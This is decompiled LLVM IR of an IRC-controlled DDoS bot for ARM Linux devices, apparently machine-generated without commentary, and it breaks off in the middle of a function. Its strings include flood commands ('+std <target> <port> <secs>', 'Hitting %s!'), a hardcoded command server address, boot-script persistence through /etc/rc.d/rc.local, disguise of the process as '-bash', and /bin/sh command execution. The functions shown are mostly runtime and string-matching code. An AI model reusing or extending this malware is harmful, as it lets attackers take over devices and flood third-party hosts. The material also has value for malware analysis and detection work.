source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%pollfd = type { i32, i16, i16 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%rlimit = type { i32, i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_80a0.17 = constant i32 -352321502
@global_var_27010.21 = global i32 0
@global_var_27028.22 = global i32* @global_var_27010.21
@global_var_2b8e0.29 = global i32 0
@global_var_27014.32 = global i32 0
@global_var_a1c4.36 = constant i32 -509558771
@global_var_2bd0c.41 = global i32 0
@global_var_3021c.43 = global i32 0
@global_var_1cfe4.45 = constant [33 x i8] c"NOTICE %s :Unable to resolve %s\0A\00"
@global_var_1d008.50 = constant [30 x i8] c"NOTICE %s :Unable to comply.\0A\00"
@global_var_2b908.52 = local_unnamed_addr global i32 0
@global_var_30234.54 = global i32 0
@global_var_1d028.56 = constant [16 x i8] c"/usr/dict/words\00"
@global_var_1d038.58 = constant i32 114
@global_var_30210.60 = local_unnamed_addr global i32 0
@global_var_1d03c.62 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_30230.64 = local_unnamed_addr global i32 0
@global_var_1d058.66 = constant [46 x i8] c"PRIVMSG %s :>bot +std <target> <port> <secs>\0A\00"
@global_var_1d088.68 = constant [30 x i8] c"PRIVMSG %s :[STD]Hitting %s!\0A\00"
@global_var_1d0a8.70 = constant [4 x i8] c"std\00"
@global_var_1d0ac.72 = constant [35 x i8] c"PRIVMSG %s :[STD]Done hitting %s!\0A\00"
@global_var_1d0d0.76 = constant [29 x i8] c"PRIVMSG %s :Killing pid %d.\0A\00"
@global_var_1d0f0.80 = constant [43 x i8] c"PRIVMSG %s :>bot +unknown <target> <secs>\0A\00"
@global_var_1d11c.82 = constant [30 x i8] c"PRIVMSG %s :[UNK]Hitting %s!\0A\00"
@global_var_1d13c.84 = constant [35 x i8] c"PRIVMSG %s :[UNK]Done hitting %s!\0A\00"
@global_var_1cfdc.86 = constant [5 x i8] c"Fine\00"
@global_var_1d17c.87 = constant [5 x i8] c"+std\00"
@global_var_2703c.88 = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1cfdc.86, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1d17c.87, i32 0, i32 0)]
@global_var_1d160.91 = constant [25 x i8] c"PRIVMSG %s :Nice try...\0A\00"
@global_var_30218.94 = global i32 0
@global_var_1d1ac.96 = constant i32 0
@global_var_27040.98 = global [5 x i8]* @global_var_1d17c.87
@global_var_1d1b0.101 = constant [15 x i8] c"MODE %s +pixB\0A\00"
@global_var_3022c.104 = local_unnamed_addr global i32 0
@global_var_1d1c0.106 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_1d1d0.108 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_1d1d8.110 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_2b904.113 = global i32 0
@global_var_1d1e4.116 = constant [93 x i8] c"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\0A\00"
@global_var_1d244.124 = constant i32 0
@global_var_2b8f8.127 = global i32 0
@global_var_27030.129 = local_unnamed_addr global i32 1
@global_var_1cfcc.131 = constant [14 x i8] c"178.156.202.2\00"
@global_var_27034.132 = global [14 x i8]* @global_var_1cfcc.131
@global_var_30224.134 = global i32 0
@global_var_1d268.136 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@global_var_1d27c.139 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_1d28c.141 = constant i32 47
@global_var_1d290.143 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_1d298.145 = constant i32 97
@global_var_1d29c.147 = constant [6 x i8] c"-bash\00"
@global_var_1d2a4.152 = constant [4 x i8] c"STD\00"
@global_var_30220.154 = local_unnamed_addr global i32 0
@global_var_1d2a8.156 = constant [12 x i8] c"STD IRC Bot\00"
@global_var_1d2b4.159 = constant i32 35
@global_var_30214.162 = local_unnamed_addr global i32 0
@global_var_1d2b8.166 = constant [9 x i8] c"PASS %s\0A\00"
@global_var_1d2c4.168 = constant [41 x i8] c"NICK %s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_1d2f0.172 = constant i32 10
@global_var_1d248.174 = constant [4 x i8] c"352\00"
@global_var_27068.175 = global [4 x i8]* @global_var_1d248.174
@global_var_1d2f4.177 = constant [6 x i8] c"ERROR\00"
@global_var_2be4c.179 = global i32 0
@global_var_2b0c0 = external global i32
@global_var_2be50.182 = global i32 0
@global_var_2be54.184 = global i32 0
@global_var_2b2a0.186 = global i32 0
@global_var_30238.188 = global i32 0
@global_var_2b2b8.190 = local_unnamed_addr global i32 0
@global_var_2b2b4.191 = local_unnamed_addr global i32 0
@global_var_2bd10.193 = global i32 0
@global_var_2bd14.195 = global i32 0
@global_var_2b484.197 = global i32 -1
@global_var_2b480.199 = global i32* @global_var_2b0c0
@global_var_30248.202 = local_unnamed_addr global i32 0
@global_var_2b490.204 = global i32 34
@global_var_270a0.207 = global i32 0
@global_var_2b0a0.209 = global i32 2
@global_var_103d0.211 = constant i32 -382910448
@global_var_3023c.215 = global i32 0
@global_var_30244.217 = global i32 0
@global_var_b090.219 = constant [3 x i8] c"w\09\00"
@global_var_2b2f0.221 = global i32 0
@global_var_2b2e8.222 = global i32 0
@global_var_2b2ec.223 = local_unnamed_addr global i32 0
@global_var_2b2e4.224 = local_unnamed_addr global i32* @global_var_2b2e8.222
@global_var_2b48c.226 = global i32 33
@global_var_131cc.229 = constant i32 -497995776
@global_var_d688.232 = constant i32 -382910416
@global_var_b094.234 = constant i32 -382910416
@global_var_300c8.241 = global i32 0
@global_var_2bd18.245 = global i32 0
@global_var_af9c.249 = constant i32 -509591552
@global_var_aec0.252 = constant i32 -498216808
@global_var_2be58.254 = global i32 0
@global_var_2be5c.256 = global i32 0
@global_var_270b0.259 = global i32 0
@global_var_2b2bc.260 = local_unnamed_addr global i32* @global_var_270b0.259
@global_var_2bd1c.262 = global i32 0
@global_var_2bd34.265 = global i32 0
@global_var_2bd38.267 = global i32 0
@global_var_2bd3c.269 = global i32 0
@global_var_30254.271 = global i32 0
@global_var_3009c.273 = global i32 0
@global_var_baa0.280 = constant i32 -442564508
@global_var_badc.281 = constant i32 -442564548
@global_var_c034.295 = constant i32 48700
@global_var_be3c.296 = constant i32 -382910416
@global_var_2bd40.306 = global i32 0
@global_var_2b488.309 = global i32 32
@global_var_c310.313 = constant i32 -382910224
@global_var_c374.315 = constant i32 -382908944
@global_var_c290.322 = constant i32 -509546482
@global_var_2be48.329 = global i32 0
@global_var_2be44.331 = global i32 0
@global_var_c938.338 = constant i32 -369097902
@global_var_2b558.342 = global i32 35
@global_var_2b55c.344 = global i32 64
@global_var_270c0.348 = global i32 0
@global_var_2be64.356 = global i32 0
@global_var_30250.370 = global i32 0
@global_var_2deac.373 = global i32 0
@global_var_2dea8.376 = global i32 0
@global_var_fdc0.380 = constant i32 -382910352
@global_var_2b57c.384 = global i32* bitcast (i8** @global_var_2b5b4.383 to i32*)
@global_var_2b10c.387 = local_unnamed_addr global i32* @global_var_2deac.373
@global_var_2b5b0.389 = global i32 2
@global_var_2b0d4.391 = local_unnamed_addr global i32 0
@global_var_2b104.392 = local_unnamed_addr global i32* @global_var_2dea8.376
@global_var_10904.393 = constant i32 -382910448
@global_var_de48.395 = constant i32 -382910448
@global_var_2be60.404 = global i32 0
@global_var_d8c8.405 = constant i32 -382908944
@global_var_3024c.410 = global i32 0
@global_var_2b25c.412 = local_unnamed_addr global i32 0
@global_var_2b260.414 = local_unnamed_addr global i32 0
@global_var_b924.417 = constant i32 -382910416
@global_var_2b448.418 = local_unnamed_addr global i32 0
@global_var_2b44c.421 = local_unnamed_addr global i32 0
@global_var_2b2b0.422 = local_unnamed_addr global i32 0
@global_var_b1cc.424 = constant i32 -442550536
@global_var_cec0.433 = constant i32 -382910352
@global_var_ecfc.435 = constant i32 -498216812
@global_var_e9b8.458 = constant i32 -476053394
@global_var_eac8.461 = constant i32 -442695672
@global_var_d674.471 = constant i32 -442552312
@global_var_ecac.476 = constant i32 -382910416
@global_var_2be68.485 = global i32 0
@global_var_2be80.487 = global i32 0
@global_var_2be8c.489 = global i32 0
@global_var_f740.508 = constant i32 -382910416
@global_var_e6d4.511 = constant i32 -382910416
@global_var_2be90.530 = global i32 0
@global_var_2de90.535 = global i32 0
@global_var_fd48.543 = constant i32 -476053493
@global_var_fef4.546 = constant i32 -275775369
@global_var_fee0.547 = constant i32 -369098687
@global_var_10930.549 = constant i32 -481230848
@global_var_2b564 = external local_unnamed_addr global i32
@global_var_2b598.559 = global i32 0
@global_var_2deb0.561 = global i32 0
@global_var_134b0.563 = constant i32 -481296384
@global_var_10bb0.564 = constant i32 -442564544
@global_var_2deb4.566 = global i32 0
@global_var_2b580.577 = global i32 0
@global_var_10f78.578 = constant i32 -442564492
@global_var_1d628.585 = constant i32 0
@global_var_f790.590 = constant i32 -443535348
@global_var_11138.591 = constant i32 -382910448
@global_var_14dc0.592 = constant i32 -382909968
@global_var_14e7c.593 = constant i32 -382910224
@global_var_1d65c.595 = constant i32 135270416
@global_var_1d640.597 = constant [6 x i8] c"(nil)\00"
@global_var_1d648.600 = constant [7 x i8] c"(null)\00"
@global_var_1d650.602 = constant i32 2949163
@global_var_1d6dc.605 = constant i32 16843008
@global_var_1d6c4.607 = constant i32 327688
@global_var_2b898 = external global i32
@global_var_1e696.612 = constant i32 65536
@global_var_1d6bc.614 = constant [8 x i8] c" +0-#'I\00"
@global_var_1d664.616 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_1d6a4.618 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_1d697.620 = constant i32 117506048
@global_var_1d698.622 = constant i32 252117248
@global_var_1d688.624 = constant i32 331776
@global_var_1d678.626 = constant i32 335616
@global_var_1268c.658 = constant i32 -456978431
@global_var_1d6f8.662 = constant [8 x i8] c"Success\00"
@global_var_1d6e8.664 = constant [15 x i8] c"Unknown error \00"
@global_var_2b8a0.666 = global i32* @global_var_1e696.612
@global_var_30088.672 = global i32 0
@global_var_2febc.674 = global i32 0
@global_var_2b8c0.676 = global i32 0
@global_var_30330.681 = global i32 0
@global_var_30324.684 = global i32 0
@global_var_2b7a0.688 = global i32 256
@global_var_2b6a4.689 = global i32* @global_var_2b7a0.688
@global_var_14c30.693 = constant i32 -382910416
@global_var_12610.694 = constant i32 -509595648
@global_var_13530.701 = constant i32 -442564520
@global_var_2b7ac.707 = global i32 0
@global_var_300b4.710 = global i32 0
@global_var_ffec.712 = constant i32 -509587456
@global_var_2b7c4.714 = global i32 0
@global_var_2b7dc = external global i32
@global_var_2b7fc.720 = global i32 -1726662223
@global_var_2b7e4.727 = local_unnamed_addr global i32* @global_var_2b7fc.720
@global_var_2b7e0.729 = global i32* @global_var_2b7fc.720
@global_var_1e254.743 = constant i32 0
@global_var_1e27c.750 = constant [8 x i8] c"/bin/sh\00"
@global_var_1e284.752 = constant [3 x i8] c"sh\00"
@global_var_1e288.754 = constant [3 x i8] c"-c\00"
@global_var_2b878.758 = global i32 0
@global_var_300b8.762 = global i32 0
@global_var_11080.765 = constant i32 -382910416
@global_var_300c4.767 = global i32 0
@global_var_300bc.770 = global i32 0
@global_var_27000.772 = global i32 -1
@global_var_300cc.775 = global i32 0
@global_var_300d0.777 = local_unnamed_addr global i32 0
@global_var_14594.778 = constant i32 -390234096
@global_var_1e28c.780 = constant [10 x i8] c"/dev/null\00"
@global_var_300d4.782 = global i32 0
@global_var_11000.786 = constant i32 -382909968
@global_var_300c0.788 = local_unnamed_addr global i32 0
@global_var_12600.791 = constant [3 x i8] c"r\0D\00"
@global_var_2b890 = external local_unnamed_addr global i32
@global_var_ad60.803 = constant i32 -449978364
@global_var_1485c.804 = constant i32 -335544717
@global_var_300dc.807 = global i32 0
@global_var_3026c.809 = global i32 0
@global_var_f604.813 = constant i32 -382910224
@global_var_300d8.815 = global i32 0
@global_var_14894.817 = constant i32 -442552292
@global_var_302fc.821 = global i32 0
@global_var_30310.824 = global i32 0
@global_var_30300.827 = global i32 0
@global_var_30270.830 = global i32 0
@global_var_30204.836 = global i32 0
@global_var_1e898.841 = constant [4 x i8] c"inf\00"
@global_var_1e8ac.844 = constant i32 1076101120
@global_var_1e89b.849 = constant i32 1179535616
@global_var_1e8a8.851 = constant i32 2883630
@global_var_1228c.853 = constant i32 -382908944
@global_var_16628.858 = constant i32 91784
@global_var_2b570 = external global i32
@global_var_1e8f4.861 = constant [31 x i8] c"clntudp_create: out of memory\0A\00"
@global_var_2b8a4.863 = global i32 92880
@global_var_16950.864 = constant i32 -444268464
@global_var_10014.867 = constant i32 -382910448
@global_var_302f0.870 = global i32 0
@global_var_302f4.871 = local_unnamed_addr global i32 0
@global_var_302f8.872 = local_unnamed_addr global i32 0
@global_var_301a4.880 = global i32 0
@global_var_301bc.883 = global i32 0
@global_var_301c0.886 = global i32 0
@global_var_17398.897 = constant i32 -382910416
@global_var_1e924.900 = constant i32 0
@global_var_1e93c.904 = constant i32 98244
@global_var_18024.905 = constant i32 -481296384
@global_var_1e948.907 = constant [36 x i8] c"bad auth_len gid %d str %d auth %d\0A\00"
@global_var_182f0.908 = constant i32 -369098742
@global_var_185cc.909 = constant i32 -369098742
@global_var_186c8.910 = constant i32 -369098741
@global_var_301d8.912 = global i32 0
@global_var_1e9a2.914 = constant i32 0
@global_var_1e96c.917 = constant [27 x i8] c"xdr_string: out of memory\0A\00"
@global_var_1e988.920 = constant [26 x i8] c"xdr_bytes: out of memory\0A\00"
@global_var_1e9a8.922 = constant i32 101028
@global_var_301dc.926 = global i32 0
@global_var_301f4.931 = local_unnamed_addr global i32 0
@global_var_30334.938 = global i32 0
@global_var_1e9d0.940 = constant i32 46
@global_var_30314.942 = global i32 0
@global_var_19438.944 = constant i32 -369098656
@global_var_1e9d4.951 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_1e9e8.953 = constant i32 114
@global_var_1e9ec.955 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_1ea04.958 = constant [11 x i8] c"nameserver\00"
@global_var_1ea10.961 = constant [7 x i8] c"domain\00"
@global_var_1ea18.963 = constant [7 x i8] c"search\00"
@global_var_30338.968 = global i32 0
@global_var_301f8.971 = global i32 0
@global_var_301fc.973 = global i32 0
@global_var_30200.980 = global i32 0
@global_var_303b8.986 = global i32 0
@global_var_303bc.988 = global i32 0
@global_var_1ea20.1002 = constant i32 107500
@global_var_1a4e0.1003 = constant i32 -444268484
@global_var_1ea34.1010 = constant [24 x i8] c"__get_myaddress: socket\00"
@global_var_1ea4c.1013 = constant [53 x i8] c"__get_myaddress: ioctl (get interface configuration)\00"
@global_var_1ea84.1016 = constant [23 x i8] c"__get_myaddress: ioctl\00"
@global_var_1eab4.1018 = constant i32 5
@global_var_1eabc.1024 = constant i32 60
@global_var_1a934.1026 = constant i32 -442695632
@global_var_1ea9c.1033 = constant [24 x i8] c"Cannot register service\00"
@global_var_1aa44.1034 = constant i32 -442695632
@global_var_3020c.1036 = global i32 0
@global_var_1eac4.1039 = constant [26 x i8] c"xdr_array: out of memory\0A\00"
@global_var_1eaf4.1041 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_1eae0.1043 = constant i32 0
@global_var_1eb08.1046 = constant [3 x i8] c"%x\00"
@global_var_1eb0c.1049 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1eb18.1051 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_1eb2e.1056 = constant i32 1931804672
@global_var_1eb2c.1058 = constant [3 x i8] c": \00"
@global_var_1eb30.1061 = constant [8 x i8] c"%s%s%m\0A\00"
@global_var_1ed78.1065 = constant [13 x i8] c"RPC: Success\00"
@global_var_1ece8.1067 = constant i32 0
@global_var_1eb38.1069 = constant [26 x i8] c"RPC: (unknown error code)\00"
@global_var_1eb54.1072 = constant [5 x i8] c"%s: \00"
@global_var_1eb5c.1074 = constant [4 x i8] c" - \00"
@global_var_1eb60.1079 = constant [13 x i8] c"; errno = %s\00"
@global_var_1ec20.1081 = constant [18 x i8] c"Authentication OK\00"
@global_var_1ebe0.1083 = constant i32 0
@global_var_1eb98.1085 = constant [9 x i8] c"; why = \00"
@global_var_1eba4.1087 = constant [36 x i8] c"(unknown authentication error - %d)\00"
@global_var_1eb70.1089 = constant [40 x i8] c"; low version = %lu, high version = %lu\00"
@global_var_1ebc8.1091 = constant [21 x i8] c"; s1 = %lu, s2 = %lu\00"
@global_var_1c6d4.1093 = constant i32 -504313148
@global_var_1c6bc.1094 = constant i32 -483131392
@global_var_1c57c.1095 = constant i32 -481294847
@global_var_1c734.1096 = constant i32 -477821825
@global_var_1c834.1097 = constant i32 -476034303
@global_var_1cb20.1098 = constant i32 -516685812
@global_var_1ca24.1099 = constant i32 -905969576
@global_var_1cba0.1100 = constant i32 -478149505
@global_var_1cb88.1101 = constant i32 -534773758
@global_var_1cb3c.1102 = constant i32 -534773758
@global_var_1cad4.1103 = constant i32 -483131392
@global_var_27008.1105 = global i32 0
@global_var_27004.1106 = global i32 55496
@global_var_2b8dc.19 = external global i8*
@global_var_2b90c.39 = external global i8*
@global_var_2b8fc.47 = external local_unnamed_addr global i8*
@global_var_2b900.118 = external local_unnamed_addr global i8*
@global_var_2b903.119 = external local_unnamed_addr global i8*
@global_var_2b902.120 = external local_unnamed_addr global i8*
@global_var_2b901.121 = external local_unnamed_addr global i8*
@global_var_f360.275 = constant i8 12
@1 = internal constant [3 x i8] c" \01\00"
@global_var_2b5b4.383 = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @1, i32 0, i32 0)
@global_var_2b604.553 = local_unnamed_addr global i8 16
@global_var_2b5b5.582 = local_unnamed_addr global i8 1
@global_var_2b605.583 = local_unnamed_addr global i8 1
@global_var_2feb8.668 = global i16* null
@2 = internal constant [2 x i8] c"\01\00"
@global_var_2b8bc.933 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @2, i32 0, i32 0)
@global_var_2b8bd.934 = local_unnamed_addr global i8 0
@global_var_30208.1006 = external global i8*
@global_var_30209.1007 = local_unnamed_addr global i8 0

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  %v0_80a0 = call i32 @frame_dummy()
  store i32 %v0_80a0, i32* @r0, align 4
  %v1_80a4 = call i32 @__do_global_ctors_aux(i32 %v0_80a0)
  call void @__pseudo_branch(i32 %v3_8098)
  ret i32 %v1_80a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_2b8dc.19 to i32), i32* %r5.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_2b8dc.19 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_80c0 = load i32, i32* @r0, align 4
  ret i32 %v12_80c0

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_27028.22 to i32), i32* %r4.global-to-local, align 4
  %v2_80c8 = load i32, i32* bitcast (i32** @global_var_27028.22 to i32*), align 4
  store i32 %v2_80c8, i32* %r2.global-to-local, align 4
  %v2_80d0 = icmp eq i32 %v2_80c8, 0
  br i1 %v2_80d0, label %bb8, label %dec_label_pc_80d8

dec_label_pc_80d8:                                ; preds = %bb7, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge
  %v1_80dc = phi i32 [ %v1_80dc.pre, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ ptrtoint (i32** @global_var_27028.22 to i32), %bb7 ]
  %v0_80d8 = phi i32 [ %v2_80e8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ %v2_80c8, %bb7 ]
  %v1_80d8 = add i32 %v0_80d8, 4
  %v2_80dc = inttoptr i32 %v1_80dc to i32*
  store i32 %v1_80d8, i32* %v2_80dc, align 4
  %v0_80e4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v2_80e8 = load i32, i32* bitcast (i32** @global_var_27028.22 to i32*), align 4
  store i32 %v2_80e8, i32* %r2.global-to-local, align 4
  %v2_80f0 = icmp eq i32 %v2_80e8, 0
  br i1 %v2_80f0, label %.loopexit, label %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge

dec_label_pc_80d8.dec_label_pc_80d8_crit_edge:    ; preds = %dec_label_pc_80d8
  %v1_80dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_80d8

.loopexit:                                        ; preds = %dec_label_pc_80d8
  %v2_8110.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8110 = phi i32 [ %v2_8110.pre, %.loopexit ], [ ptrtoint (i8** @global_var_2b8dc.19 to i32), %bb7 ]
  %v3_8110 = inttoptr i32 %v2_8110 to i8*
  store i8 1, i8* %v3_8110, align 1
  %v2_8114 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8114, i32* %r4.global-to-local, align 4
  %v11_8114 = load i32, i32* @r0, align 4
  ret i32 %v11_8114

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 2, 0 }
  uselistorder i32** @global_var_27028.22, { 1, 0 }
  uselistorder i8** @global_var_2b8dc.19, { 1, 0 }
  uselistorder label %dec_label_pc_80d8, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v5_812c = load i32, i32* @r0, align 4
  ret i32 %v5_812c
}

define i32 @frame_dummy() local_unnamed_addr {
.thread:
  %v2_8150 = load i32, i32* @global_var_27014.32, align 4
  %v2_8154 = icmp eq i32 %v2_8150, 0
  br i1 %v2_8154, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_27014.32 to i32)

bb2:                                              ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_27014.32 to i32)

; uselistorder directives
  uselistorder i32* @global_var_27014.32, { 1, 0 }
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v5_818c = load i32, i32* @r0, align 4
  ret i32 %v5_818c
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @fp, align 4
  %v4_8198 = ptrtoint i32* %stack_var_4 to i32
  %v8_81b8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_a1c4.36 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 118712, i32 %arg1, i32 %v4_8198)
  %v0_81bc = call i32 @abort()
  ret i32 %v0_81bc
}

define i32 @strwildmatch(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp19 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_81d0 = load i32, i32* @r4, align 4
  %v6_81d0 = load i32, i32* @fp, align 4
  store i32 33240, i32* %stack_var_-4, align 4
  %v2_81d4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_81d4, i32* @fp, align 4
  %v2_81e8 = load i8, i8* %arg1, align 1
  %v7_81f4 = icmp eq i8 %v2_81e8, 84
  br i1 %v7_81f4, label %dec_label_pc_84b4, label %dec_label_pc_81fc

dec_label_pc_81fc:                                ; preds = %entry
  %v8_8204 = icmp ugt i8 %v2_81e8, 84
  br i1 %v8_8204, label %dec_label_pc_824c, label %dec_label_pc_8208

dec_label_pc_8208:                                ; preds = %dec_label_pc_81fc
  %v7_820c = icmp eq i8 %v2_81e8, 66
  br i1 %v7_820c, label %dec_label_pc_83d4, label %dec_label_pc_8214

dec_label_pc_8214:                                ; preds = %dec_label_pc_8208
  %v8_821c = icmp ugt i8 %v2_81e8, 66
  br i1 %v8_821c, label %dec_label_pc_823c, label %dec_label_pc_8220

dec_label_pc_8220:                                ; preds = %dec_label_pc_8214
  %v2_8224 = icmp eq i8 %v2_81e8, 0
  br i1 %v2_8224, label %dec_label_pc_8274, label %dec_label_pc_822c

dec_label_pc_822c:                                ; preds = %dec_label_pc_8220
  %v7_8230 = icmp eq i8 %v2_81e8, 63
  br i1 %v7_8230, label %dec_label_pc_8524, label %dec_label_pc_857c

dec_label_pc_823c:                                ; preds = %dec_label_pc_8214
  %v7_8240 = icmp eq i8 %v2_81e8, 79
  br i1 %v7_8240, label %dec_label_pc_8444, label %dec_label_pc_857c

dec_label_pc_824c:                                ; preds = %dec_label_pc_81fc
  %v7_8250 = icmp eq i8 %v2_81e8, 111
  br i1 %v7_8250, label %dec_label_pc_82f4, label %dec_label_pc_8258

dec_label_pc_8258:                                ; preds = %dec_label_pc_824c
  %v7_825c = icmp eq i8 %v2_81e8, 116
  br i1 %v7_825c, label %dec_label_pc_8364, label %dec_label_pc_8264

dec_label_pc_8264:                                ; preds = %dec_label_pc_8258
  %v7_8268 = icmp eq i8 %v2_81e8, 98
  br i1 %v7_8268, label %dec_label_pc_8284, label %dec_label_pc_857c

dec_label_pc_8274:                                ; preds = %dec_label_pc_8220
  %v2_8278 = load i8, i8* %tmp, align 1
  %v3_8278 = zext i8 %v2_8278 to i32
  br label %dec_label_pc_85f0

dec_label_pc_8284:                                ; preds = %dec_label_pc_8264
  %v1_8288 = add i32 %tmp19, 1
  %v3_8294 = inttoptr i32 %v1_8288 to i8*
  %v4_8294 = call i32 @strwildmatch(i8* %v3_8294, i32 %arg2)
  %v2_829c = icmp eq i32 %v4_8294, 0
  br i1 %v2_829c, label %dec_label_pc_82e0, label %dec_label_pc_82a4

dec_label_pc_82a4:                                ; preds = %dec_label_pc_8284
  %v2_82a8 = load i8, i8* %tmp, align 1
  %v2_82ac = icmp eq i8 %v2_82a8, 0
  br i1 %v2_82ac, label %dec_label_pc_82e8, label %dec_label_pc_82b4

dec_label_pc_82b4:                                ; preds = %dec_label_pc_82a4
  %v1_82b8 = add i32 %arg2, 1
  %v4_82c4 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_82b8)
  %v2_82cc = icmp eq i32 %v4_82c4, 0
  br i1 %v2_82cc, label %dec_label_pc_82e0, label %dec_label_pc_82e8

dec_label_pc_82e0:                                ; preds = %dec_label_pc_82b4, %dec_label_pc_8284
  br label %dec_label_pc_82e8

dec_label_pc_82e8:                                ; preds = %dec_label_pc_82a4, %dec_label_pc_82b4, %dec_label_pc_82e0
  %storemerge6 = phi i32 [ 0, %dec_label_pc_82e0 ], [ 1, %dec_label_pc_82b4 ], [ 1, %dec_label_pc_82a4 ]
  br label %dec_label_pc_85f0

dec_label_pc_82f4:                                ; preds = %dec_label_pc_824c
  %v1_82f8 = add i32 %tmp19, 1
  %v3_8304 = inttoptr i32 %v1_82f8 to i8*
  %v4_8304 = call i32 @strwildmatch(i8* %v3_8304, i32 %arg2)
  %v2_830c = icmp eq i32 %v4_8304, 0
  br i1 %v2_830c, label %dec_label_pc_8350, label %dec_label_pc_8314

dec_label_pc_8314:                                ; preds = %dec_label_pc_82f4
  %v2_8318 = load i8, i8* %tmp, align 1
  %v2_831c = icmp eq i8 %v2_8318, 0
  br i1 %v2_831c, label %dec_label_pc_8358, label %dec_label_pc_8324

dec_label_pc_8324:                                ; preds = %dec_label_pc_8314
  %v1_8328 = add i32 %arg2, 1
  %v4_8334 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_8328)
  %v2_833c = icmp eq i32 %v4_8334, 0
  br i1 %v2_833c, label %dec_label_pc_8350, label %dec_label_pc_8358

dec_label_pc_8350:                                ; preds = %dec_label_pc_8324, %dec_label_pc_82f4
  br label %dec_label_pc_8358

dec_label_pc_8358:                                ; preds = %dec_label_pc_8314, %dec_label_pc_8324, %dec_label_pc_8350
  %storemerge8 = phi i32 [ 0, %dec_label_pc_8350 ], [ 1, %dec_label_pc_8324 ], [ 1, %dec_label_pc_8314 ]
  br label %dec_label_pc_85f0

dec_label_pc_8364:                                ; preds = %dec_label_pc_8258
  %v1_8368 = add i32 %tmp19, 1
  %v3_8374 = inttoptr i32 %v1_8368 to i8*
  %v4_8374 = call i32 @strwildmatch(i8* %v3_8374, i32 %arg2)
  %v2_837c = icmp eq i32 %v4_8374, 0
  br i1 %v2_837c, label %dec_label_pc_83c0, label %dec_label_pc_8384

dec_label_pc_8384:                                ; preds = %dec_label_pc_8364
  %v2_8388 = load i8, i8* %tmp, align 1
